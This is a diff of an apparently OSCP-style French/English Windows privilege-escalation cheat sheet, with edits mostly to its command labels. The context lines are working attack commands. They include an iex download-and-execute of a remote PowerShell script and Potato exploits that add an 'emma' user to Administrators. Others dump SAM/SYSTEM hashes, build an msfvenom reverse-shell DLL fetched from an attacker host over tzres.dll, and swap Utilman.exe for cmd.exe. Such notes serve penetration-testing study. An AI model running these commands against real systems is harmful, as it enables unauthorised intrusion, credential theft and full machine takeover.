 # Using Netcat
@@ -1697,7 +1673,7 @@ run
 `msiexec`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ./malicious.msi.</p>
+<p class="oscp-command-note">Script shell dans la rubrique « Exploiting the Vulnerability ».</p>
 
 ```bash
 # If the payload is a reverse shell, it could maybe work by just executing the .msi, try it; otherwise just use below steps
@@ -1714,7 +1690,7 @@ msiexec /quiet /qn /i malicious.msi
 ### WinPEAS
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ..</p>
+
 
 ```powershell
 .\winPEAS.ps1
@@ -1731,7 +1707,7 @@ msiexec /quiet /qn /i malicious.msi
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil python3.</p>
+<p class="oscp-command-note">Exécuter un script Python.</p>
 
 ```powershell
 # 1. Download file from victim to local Kali, we could use techniques from section 17.
@@ -1747,7 +1723,7 @@ python3 json2pdf.py peass.json peass.pdf
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil get-content.</p>
+
 
 ```powershell
 Get-Content winpeas_output.txt | ConvertTo-Html | Out-File winpeas_output.html
@@ -1757,7 +1733,7 @@ Get-Content winpeas_output.txt | ConvertTo-Html | Out-File winpeas_output.html
 ### PowerUp
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ..</p>
+
 
 ```powershell
 .\powerup.ps1
@@ -1797,7 +1773,7 @@ Get-Content winpeas_output.txt | ConvertTo-Html | Out-File winpeas_output.html
 ### PowerCat
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ..</p>
+
 
 ```powershell
 .\powercat.ps1 -c [target_IP] -p [port] -e [command]
@@ -1822,7 +1798,7 @@ Get-Content winpeas_output.txt | ConvertTo-Html | Out-File winpeas_output.html
 ### PowerView
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ..</p>
+<p class="oscp-command-note">Script PowerShell dans la rubrique « PowerView ».</p>
 
 ```powershell
 .\PowerView.ps1
@@ -1865,7 +1841,7 @@ Import-Module ./PowerView.ps1
 ### PowerMad
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ..</p>
+
 
 ```powershell
 .\PowerMad.ps1
@@ -1885,7 +1861,7 @@ Import-Module ./PowerView.ps1
 ### PrivescCheck
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ..</p>
+
 
 ```powershell
 .\PrivescCheck.ps1
@@ -1905,7 +1881,7 @@ Import-Module ./PowerView.ps1
 ### Seatbelt
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ..</p>
+
 
 ```powershell
 .\Seatbelt.exe
@@ -1915,7 +1891,7 @@ Import-Module ./PowerView.ps1
 #### Setup
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil git.</p>
+<p class="oscp-command-note">Examiner les fichiers et l&#x27;historique Git.</p>
 
 ```bash
 git clone https://github.com/S3cur3Th1sSh1t/PowerSharpPack
@@ -1923,7 +1899,7 @@ cd PowerSharpPack
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil iex.</p>
+
 
 ```powershell
 iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1')
@@ -1934,7 +1910,7 @@ iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 `-Command`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil powersharppack.</p>
+
 
 ```powershell
 PowerSharpPack -seatbelt -Command "AMSIProviders"
@@ -1944,7 +1920,7 @@ PowerSharpPack -seatbelt -Command "AMSIProviders"
 #### Included Tools and Code Examples
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil powersharppack.</p>
+
 
 ```powershell
 PowerSharpPack -InternalMonologue
@@ -2003,7 +1979,7 @@ PowerSharpPack -SharpChromium
 `PowerSharpBinaries`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil powersharppack.</p>
+
 
 ```powershell
 PowerSharpPack -SharpCloud
@@ -2023,7 +1999,7 @@ PowerSharpPack -SauronEye
 #### Complémentaire Tools
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil powersharppack.</p>
+
 
 ```powershell
 PowerSharpPack -SharpShares
@@ -2053,7 +2029,7 @@ PowerSharpPack -Watson
 #### Execution Tips
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil powersharppack.</p>
+
 
 ```powershell
 PowerSharpPack -Rubeus -Command "kerberoast /outfile:roasted.txt /domain:example.com"
@@ -2067,7 +2043,7 @@ PowerSharpPack -Rubeus -Command "kerberoast /outfile:roasted.txt /domain:example
 ## Potatoes
 
 
-<p class="oscp-command-note">Afficher des informations de la session ou du système.</p>
+<p class="oscp-command-note">Afficher le compte utilisateur courant.</p>
 
 ```text
 whoami /priv
@@ -2078,7 +2054,7 @@ whoami /priv
 `winPEAS`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil nt.</p>
+
 
 ```text
 NT AUTHORITY\SYSTEM
@@ -2092,7 +2068,7 @@ NT AUTHORITY\SYSTEM
 ### DCOMPotato
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil dcompotato.exe.</p>
+
 
 ```bash
 DCOMPotato.exe -c "C:\Windows\System32\cmd.exe"
@@ -2116,7 +2092,7 @@ DCOMPotato.exe -c "C:\Windows\System32\net.exe localgroup Administrators emma /a
 ### EfsPotato
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil efspotato.exe.</p>
+
 
 ```bash
 EfsPotato.exe "C:\Windows\System32\cmd.exe"
@@ -2140,7 +2116,7 @@ EfsPotato.exe -c "C:\Windows\System32\net.exe localgroup Administrators emma /ad
 ### GodPotato
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil godpotato.exe.</p>
+
 
 ```bash
 GodPotato.exe -cmd "C:\Windows\System32\cmd.exe"
@@ -2164,7 +2140,7 @@ GodPotato.exe -cmd "C:\Windows\System32\net.exe localgroup Administrators emma /
 ### Hot Potato (CVE-2016-3225)
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil hotpotato.exe.</p>
+
 
 ```bash
 HotPotato.exe -ip -cmd "C:\Windows\System32\cmd.exe"
@@ -2188,7 +2164,7 @@ HotPotato.exe -ip -cmd "C:\Windows\System32\net.exe localgroup Administrators em
 ### Juicy Potato
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil juicypotato.exe.</p>
+
 
 ```bash
 JuicyPotato.exe -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097} -t * -p c:\windows\system32\cmd.exe
@@ -2212,7 +2188,7 @@ JuicyPotato.exe -l 1337 -c [clsid] -t * -p "C:\Windows\System32\net.exe localgro
 ### PrintSpoofer
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil printspoofer.exe.</p>
+
 
 ```bash
 PrintSpoofer.exe -c whoami
@@ -2236,7 +2212,7 @@ PrintSpoofer.exe -c "C:\Windows\System32\net.exe localgroup Administrators emma 
 ### Rogue Potato
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil roguepotato.exe.</p>
+
 
 ```bash
 RoguePotato.exe -r [ATTACKER_IP] -e whoami
@@ -2267,7 +2243,7 @@ RoguePotato.exe -r [ATTACKER_IP] -e "C:\Windows\System32\net.exe localgroup Admi
 ### SharpEfsPotato
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil sharpefspotato.exe.</p>
+<p class="oscp-command-note">Script shell dans la rubrique « SharpEfsPotato ».</p>
 
 ```bash
 SharpEfsPotato.exe -p "C:\Windows\System32\cmd.exe"
@@ -2296,7 +2272,7 @@ SharpEfsPotato.exe -p "C:\Windows\System32\net.exe" -a "localgroup Administrator
 ### SigmaPotato
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil sigmapotato.exe.</p>
+
 
 ```bash
 SigmaPotato.exe cmd.exe /c whoami
@@ -2320,7 +2296,7 @@ SigmaPotato.exe cmd.exe /c "net localgroup Administrators emma /add"
 ### SweetPotato
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil sweetpotato.exe.</p>
+
 
 ```bash
 SweetPotato.exe -a whoami
@@ -2348,7 +2324,7 @@ SweetPotato.exe -a "C:\Windows\System32\net.exe localgroup Administrators emma /
 `CVE-2023-29360.exe`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ps.</p>
+<p class="oscp-command-note">Afficher les processus actifs.</p>
 
 ```powershell
 PS C:\Users\emma\Desktop> whoami
@@ -2378,7 +2354,7 @@ nt authority\system
 `SeImpersonate` · `JuicyPotato` · `RoguePotato`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil juicypotato.exe.</p>
+
 
 ```powershell
 JuicyPotato.exe -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097} -t * -p c:\windows\system32\cmd.exe
@@ -2399,7 +2375,7 @@ JuicyPotato.exe -l 1337 -c [clsid] -t * -p "C:\Windows\System32\net.exe localgro
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil roguepotato.exe.</p>
+
 
 ```powershell
 RoguePotato.exe -r [kali_ip] -e whoami
@@ -2427,7 +2403,7 @@ RoguePotato.exe -r [kali_ip] -e "C:\Windows\System32\net.exe localgroup Administ
 `SeBackupPrivilege`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil reg.</p>
+<p class="oscp-command-note">Consulter ou modifier une clé de Registre.</p>
 
 ```powershell
 reg save hklm\sam c:\Temp\sam  
@@ -2435,7 +2411,7 @@ reg save hklm\system c:\Temp\system
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-secretsdump.</p>
+<p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>
 
 ```bash
 impacket-secretsdump -system system -sam sam local
@@ -2449,14 +2425,14 @@ impacket-secretsdump -system system -sam sam local
 `SeDebugPrivesc.exe`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ps.</p>
+<p class="oscp-command-note">Afficher les processus actifs.</p>
 
 ```powershell
 ps
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ..</p>
+
 
 ```powershell
 .\SeDebugPrivesc.exe <PID> <Program and Arguments>
@@ -2473,7 +2449,7 @@ ps
 ### SeManageVolumeAbuse
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>
+
 
 ```text
 C:\
@@ -2484,25 +2460,17 @@ C:\
 `.dll`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>
-
-```text
-C:\Windows\System32\
-```
+<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\</code></p>
 
 
 **Paramètres et repères :**
 `SeManageVolumeExploit.exe`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>
-
-```text
-C:\Windows\System32\wbem\tzres.dll
-```
+<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\wbem\tzres.dll</code></p>
 
 
-<p class="oscp-command-note">Afficher des informations de la session ou du système.</p>
+<p class="oscp-command-note">Afficher la version et la configuration de Windows.</p>
 
 ```text
 systeminfo
@@ -2520,7 +2488,7 @@ whoami /priv
 `SeManageVolume`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ..</p>
+
 
 ```powershell
 .\SeManageVolumeExploit.exe
@@ -2529,21 +2497,17 @@ whoami /priv
 ![Executing the exploit.](https://www.emmanuelsolis.com/img/semanage_2.png)
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
 
 ```bash
 msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=[attacker_ip] LPORT=[port] -f dll -o tzres.dll
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>
-
-```text
-C:\Windows\System32\wbem\tzres.dll
-```
+<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\wbem\tzres.dll</code></p>
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil iwr.</p>
+<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>
 
 ```powershell
 iwr -uri http://[kali_ip]/tzres.dll -OutFile "C:\Windows\System32\wbem\tzres.dll"
@@ -2552,14 +2516,10 @@ iwr -uri http://[kali_ip]/tzres.dll -OutFile "C:\Windows\System32\wbem\tzres.dll
 ![Replacing C:\Windows\System32\wbem\tzres.dll.](https://www.emmanuelsolis.com/img/semanage_3.png)
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>
-
-```text
-C:\Windows\System32\wbem\tzres.dll
-```
+<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\wbem\tzres.dll</code></p>
 
 
-<p class="oscp-command-note">Afficher des informations de la session ou du système.</p>
+<p class="oscp-command-note">Afficher la version et la configuration de Windows.</p>
 
 ```text
 systeminfo
@@ -2580,7 +2540,7 @@ systeminfo
 `utilman.exe` · `SeRestoreAbuse.exe`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil cd.</p>
+<p class="oscp-command-note">Changer de répertoire.</p>
 
 ```powershell
 cd C:\Windows\system32
@@ -2589,14 +2549,14 @@ ren Utilman.exe Utilman.old
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ren.</p>
+
 
 ```powershell
 ren cmd.exe Utilman.exe
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil windows.</p>
+<p class="oscp-command-note">Script PowerShell dans la rubrique « SeRestore ».</p>
 
 ```powershell
 # Lock the computer
@@ -2607,14 +2567,14 @@ rdesktop [ip]
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil nt.</p>
+
 
 ```text
 nt authority\system
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil windows.</p>
+
 
 ```powershell
 # Once in the Windows Login Screen press
@@ -2626,14 +2586,14 @@ Windows + U
 `SerestoreAbuse.exe`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil iwr.</p>
+<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>
 
 ```powershell
 iwr -uri http://[kali_ip]/SeRestoreAbuse.exe -O SeRestoreAbuse.exe
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ..</p>
+<p class="oscp-command-note">Script PowerShell dans la rubrique « SeRestore ».</p>
 
 ```powershell
 # (Option 1) Netcat direct reverse shell
